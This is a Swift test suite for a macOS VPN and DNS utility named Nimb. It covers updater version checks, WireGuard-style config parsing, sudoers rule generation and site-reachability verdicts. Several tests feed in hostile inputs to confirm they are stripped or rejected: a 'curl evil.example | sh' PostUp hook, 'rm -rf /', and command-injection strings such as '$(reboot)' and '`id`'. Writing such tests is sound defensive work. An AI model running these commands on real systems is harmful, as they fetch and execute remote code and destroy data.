import Foundation
import Testing
@testable import Nimb

@Suite struct UpdaterTests {
    @Test(arguments: [
        ("0.9.5", "0.9.4", true), ("0.10.0", "0.9.9", true), ("1.0.0", "0.9.9", true), ("v0.9.5", "0.9.4", true),
        ("0.9.4", "0.9.4", false), ("0.9.3", "0.9.4", false), ("0.9", "0.9.0", false), ("0.9.1", "0.9", true), ("0.8.9", "0.9.0", false),
    ])
    func comparesVersions(candidate: String, current: String, newer: Bool) {
        #expect(Updater.isNewer(candidate, than: current) == newer)
    }

    @Test func findsTheHashOfTheArchiveByItsName() {
        let text = """
        **SHA-256**
        ```
        \(String(repeating: "a", count: 64))  Nimb-0.9.4.zip
        \(String(repeating: "B", count: 64))  Nimb-0.9.4.dmg
        ```
        """
        #expect(Updater.sha256(for: "Nimb-0.9.4.zip", in: text) == String(repeating: "a", count: 64))
        #expect(Updater.sha256(for: "Nimb-0.9.4.dmg", in: text) == String(repeating: "b", count: 64))
        #expect(Updater.sha256(for: "Nimb-0.9.5.zip", in: text) == nil)
    }

    @Test func aShortHexIsNotAHash() {
        #expect(Updater.firstSHA256(in: "abc123") == nil)
    }
}

@Suite struct WarpConfigTests {
    private let key = Data(repeating: 7, count: 32).base64EncodedString()
    private func config(extraInterface: String = "", extraPeer: String = "", allowed: String = "0.0.0.0/0, ::/0") -> String {
        """
        [Interface]
        PrivateKey = \(key)
        Address = 172.16.0.2/32, 2606:4700::2/128
        MTU = 1280
        Jc = 120
        S1 = 0
        H1 = 1
        \(extraInterface)

        [Peer]
        PublicKey = \(key)
        AllowedIPs = \(allowed)
        Endpoint = 162.159.192.1:2408
        PersistentKeepalive = 25
        \(extraPeer)
        """
    }

    @Test func readsAGoodConfig() throws {
        let parsed = try WarpConfig.parse(config())
        #expect(parsed.summary.endpoint == "162.159.192.1:2408")
        #expect(parsed.summary.addresses.count == 2)
        #expect(parsed.summary.isFullTunnel)
        #expect(parsed.file.contains("private_key=\(key)"))
        #expect(parsed.file.contains("endpoint=162.159.192.1:2408"))
        #expect(parsed.file.contains("jc=120"))
        #expect(parsed.file.contains("allowed_ip=0.0.0.0/0"))
        #expect(parsed.file.hasSuffix("\n"))
    }

    /// The helper runs as root: no line that can run a command may ever reach it.
    @Test func neverCarriesCommandsOver() throws {
        let parsed = try WarpConfig.parse(config(extraInterface: "PostUp = curl evil.example | sh\nPreDown = rm -rf /\nPostDown = x\nPreUp = y"))
        #expect(!parsed.file.lowercased().contains("postup"))
        #expect(!parsed.file.contains("curl"))
        #expect(!parsed.file.contains("rm -rf"))
        #expect(parsed.summary.ignored.count == 4)
    }

    @Test func aTunnelOfSomeRoutesIsNotFull() throws {
        let parsed = try WarpConfig.parse(config(allowed: "10.0.0.0/8"))
        #expect(!parsed.summary.isFullTunnel)
    }

    @Test func refusesWhatIsWrong() {
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config().replacingOccurrences(of: key, with: "not-a-key")) }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config().replacingOccurrences(of: "162.159.192.1:2408", with: "bad endpoint")) }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config().replacingOccurrences(of: "162.159.192.1:2408", with: "1.2.3.4:99999")) }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config(allowed: "everything")) }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config().replacingOccurrences(of: "MTU = 1280", with: "MTU = 99999")) }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config(extraInterface: "Jc = 1; reboot")) }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse("Address = 1.2.3.4/32") }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config() + "\n[Peer]\nPublicKey = \(key)\n") }
    }

    @Test func refusesAMissingPart() {
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config().replacingOccurrences(of: "PrivateKey = \(key)", with: "")) }
        #expect(throws: WarpConfigError.self) { try WarpConfig.parse(config().replacingOccurrences(of: "Address = 172.16.0.2/32, 2606:4700::2/128", with: "")) }
    }
}

@Suite struct DNSRuleTests {
    private let services = ["Wi-Fi", "Thunderbolt Bridge", "USB 10/100/1000 LAN"]

    @Test func theRuleNamesOnlyTheCommandsOfNimb() {
        let rule = DNSManager.sudoersRule(for: "daniil", services: services)
        let line = rule[1]
        #expect(line.hasPrefix("daniil ALL = (root) NOPASSWD: "))
        #expect(!line.contains("*"), "a wildcard would let any program set any DNS")
        let commands = line.replacingOccurrences(of: "daniil ALL = (root) NOPASSWD: ", with: "").components(separatedBy: ", ")
        let allowedAddresses = Set(DNSProvider.all.flatMap(\.addresses) + ["Empty"])
        for command in commands {
            if command.hasPrefix("/usr/sbin/networksetup -setdnsservers ") {
                let addresses = command.split(separator: " ").dropFirst(3).map(String.init)
                // The service name may hold spaces written as "\ ": what is left at the end are the addresses.
                #expect(addresses.contains { allowedAddresses.contains($0) }, "unexpected command: \(command)")
            } else {
                #expect(["/usr/bin/dscacheutil -flushcache", "/usr/bin/killall -HUP mDNSResponder"].contains(command), "unexpected command: \(command)")
            }
        }
        #expect(commands.contains("/usr/bin/dscacheutil -flushcache"))
    }

    @Test func everyServiceGetsEveryProviderAndAutomatic() {
        let line = DNSManager.sudoersRule(for: "daniil", services: ["Wi-Fi"])[1]
        #expect(line.contains("-setdnsservers Wi-Fi Empty"))
        for provider in DNSProvider.all { #expect(line.contains("-setdnsservers Wi-Fi \(provider.addresses.joined(separator: " "))")) }
    }

    @Test func spacesInANameAreEscaped() {
        let line = DNSManager.sudoersRule(for: "daniil", services: ["Thunderbolt Bridge"])[1]
        #expect(line.contains("-setdnsservers Thunderbolt\\ Bridge Empty"))
    }

    @Test(arguments: ["Wi-Fi", "Ethernet", "Thunderbolt Bridge", "USB 10/100/1000 LAN", "Ethernet Adapter (en6)"])
    func ordinaryNamesAreSafe(name: String) {
        #expect(DNSManager.isRuleSafe(name))
    }

    @Test(arguments: ["Wi-Fi, ALL", "x; rm -rf /", "a*b", "name\nnext", "", "$(reboot)", "`id`", "a\\b", "-flag"])
    func strangeNamesAreNotSafe(name: String) {
        #expect(!DNSManager.isRuleSafe(name))
    }

    @Test func theListOfProvidersIsSound() {
        let ids = DNSProvider.all.map(\.id)
        #expect(Set(ids).count == ids.count)
        let addresses = DNSProvider.all.flatMap(\.addresses)
        #expect(Set(addresses).count == addresses.count)
        for address in addresses { #expect(address.range(of: #"^(\d{1,3}\.){3}\d{1,3}$"#, options: .regularExpression) != nil) }
        #expect(DNSProvider.all.first?.id == "geohide-eu", "the first provider is the default one")
    }
}

@Suite struct CheckVerdictTests {
    private func probe(_ code: Int, failure: String? = nil, seconds: Double = 0.4) -> SiteProbe {
        SiteProbe(name: "p", url: "https://example.com/\(code)\(failure ?? "")\(seconds)", code: code, seconds: seconds, failure: failure)
    }

    @Test func aProbeAnswersWithAnythingButAServerError() {
        #expect(probe(200).answered)
        #expect(probe(404).answered, "a 404 of the site itself still means the site is reachable")
        #expect(probe(403).answered)
        #expect(!probe(500).answered)
        #expect(!probe(0).answered)
        #expect(!probe(200, failure: "время ожидания вышло").answered)
    }

    @Test func allAnsweredWorks() {
        let check = SiteCheck(name: "YouTube", probes: [probe(200), probe(204), probe(301)])
        #expect(check.verdict == .works)
        #expect(check.result.hasPrefix("открывается"))
    }

    @Test func someAnsweredIsPartial() {
        let check = SiteCheck(name: "YouTube", probes: [probe(200), probe(0, failure: "x"), probe(204)])
        #expect(check.verdict == .partial)
        #expect(check.result == "частично: 2 из 3")
    }

    @Test func noneAnsweredIsDown() {
        let check = SiteCheck(name: "Discord", probes: [probe(0, failure: "a"), probe(0, failure: "b")])
        #expect(check.verdict == .down)
        #expect(check.result == "не отвечает")
    }

    @Test func theTimeIsTheMedianOfTheAnswers() throws {
        let check = SiteCheck(name: "x", probes: [probe(200, seconds: 0.2), probe(200, seconds: 3.0), probe(200, seconds: 0.4), probe(0, failure: "x", seconds: 9)])
        #expect(try #require(check.seconds) == 0.4)
    }
}

@Suite struct ServiceStatusTests {
    @Test func aFewDeadAddressesInAPoolStillWork() {
        #expect(ServiceResult(name: "ChatGPT", answered: 4, blocked: 0, total: 5).status == .works)
        #expect(ServiceResult(name: "ChatGPT", answered: 3, blocked: 0, total: 4).status == .works)
    }

    @Test func tooManyDeadAddressesAreUnstable() {
        #expect(ServiceResult(name: "ChatGPT", answered: 2, blocked: 0, total: 5).status == .unstable)
    }

    @Test func aRefusalPageMakesItUnstableEvenWithManyAnswers() {
        #expect(ServiceResult(name: "Gemini", answered: 4, blocked: 1, total: 5).status == .unstable)
    }

    @Test func noAnswersIsDownOrBlocked() {
        #expect(ServiceResult(name: "Claude", answered: 0, blocked: 0, total: 5).status == .down)
        #expect(ServiceResult(name: "Claude", answered: 0, blocked: 3, total: 5).status == .blocked)
    }
}

@Suite struct FaderTests {
    @Test func movesSmoothlyInOneSecond() {
        var fader = MascotMotion.Fader()
        let start = Date(timeIntervalSinceReferenceDate: 1000)
        fader.set(1, now: start)
        #expect(fader.value(at: start) == 0)
        #expect(abs(fader.value(at: start.addingTimeInterval(0.5)) - 0.5) < 1e-9)
        #expect(fader.value(at: start.addingTimeInterval(1)) == 1)
        #expect(fader.value(at: start.addingTimeInterval(30)) == 1, "it stays at the end")
        #expect(fader.value(at: start.addingTimeInterval(-5)) == 0, "and before the start")
    }

    @Test func turningBackMidwayStartsFromWhereItIs() {
        var fader = MascotMotion.Fader()
        let start = Date(timeIntervalSinceReferenceDate: 1000)
        fader.set(1, now: start)
        let middle = start.addingTimeInterval(0.5)
        fader.set(0, now: middle)
        #expect(abs(fader.value(at: middle) - 0.5) < 1e-9, "no jump at the moment of the change")
        #expect(fader.value(at: middle.addingTimeInterval(1)) == 0)
    }

    @Test func theSameTargetDoesNotRestartIt() {
        var fader = MascotMotion.Fader()
        let start = Date(timeIntervalSinceReferenceDate: 1000)
        fader.set(1, now: start)
        fader.set(1, now: start.addingTimeInterval(0.9))
        #expect(fader.value(at: start.addingTimeInterval(1)) == 1)
    }
}

/// The warning about another key of Telegram: shown while it goes on, gone after ten quiet seconds, back when it starts again.
@Suite struct RecentCountTests {
    private let t0 = Date(timeIntervalSinceReferenceDate: 5000)

    @Test func isRecentRightAfterGrowth() {
        var watch = RecentCount(quiet: 10)
        let before = watch.observe(0, at: t0)
        let after = watch.observe(3, at: t0.addingTimeInterval(2))
        #expect(!before)
        #expect(after)
    }

    @Test func goesAwayAfterTheQuietTime() {
        var watch = RecentCount(quiet: 10)
        _ = watch.observe(3, at: t0)
        let justBefore = watch.observe(3, at: t0.addingTimeInterval(9.9))
        let atTheLimit = watch.observe(3, at: t0.addingTimeInterval(10))
        let muchLater = watch.observe(3, at: t0.addingTimeInterval(600))
        #expect(justBefore)
        #expect(!atTheLimit)
        #expect(!muchLater, "the old total alone does not bring it back")
    }

    @Test func comesBackWhenItStartsAgain() {
        var watch = RecentCount(quiet: 10)
        _ = watch.observe(3, at: t0)
        let quiet = watch.observe(3, at: t0.addingTimeInterval(30))
        let again = watch.observe(4, at: t0.addingTimeInterval(31))
        #expect(!quiet)
        #expect(again)
    }

    @Test func aCounterThatStartsAgainDoesNotCount() {
        var watch = RecentCount(quiet: 10)
        _ = watch.observe(5, at: t0)
        watch.reset()
        #expect(!watch.isRecent(at: t0.addingTimeInterval(1)))
        let zero = watch.observe(0, at: t0.addingTimeInterval(2))
        let grown = watch.observe(1, at: t0.addingTimeInterval(3))
        #expect(!zero)
        #expect(grown, "growth after the restart is new")
    }

    @Test func aCounterThatFallsIsNotGrowth() {
        var watch = RecentCount(quiet: 10)
        _ = watch.observe(5, at: t0)
        let fallen = watch.observe(2, at: t0.addingTimeInterval(20))
        let grown = watch.observe(3, at: t0.addingTimeInterval(21))
        #expect(!fallen)
        #expect(grown)
    }
}
